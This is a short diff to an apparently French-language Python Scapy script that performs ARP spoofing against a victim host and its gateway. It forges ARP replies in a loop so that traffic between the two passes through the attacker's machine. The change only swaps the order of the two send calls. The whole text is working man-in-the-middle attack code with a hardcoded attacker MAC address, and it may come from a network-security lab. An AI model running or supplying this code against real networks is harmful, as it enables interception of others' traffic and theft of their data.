@@ -25,9 +25,9 @@ atk_mac = '08:00:27:c0:36:64'
 nb_packets = 0
 while nb_packets < 100:
     spoof_arp_victime = Ether(src=atk_mac)/ARP(op=2, pdst=victime_ip, hwdst=victime_mac, psrc=passerelle_ip)
-    send_spoof1 = sendp(spoof_arp_victime)
     spoof_arp_passerelle = Ether(src=atk_mac)/ARP(op=2, pdst=passerelle_ip, hwdst=passerelle_mac, psrc=victime_ip)
-    send_spoof2 = sendp(spoof_arp_passerelle)
+    send_spoof1 = sendp(spoof_arp_passerelle)
+    send_spoof2 = sendp(spoof_arp_victime)
     nb_packets += 2
 
 print(nb_packets)
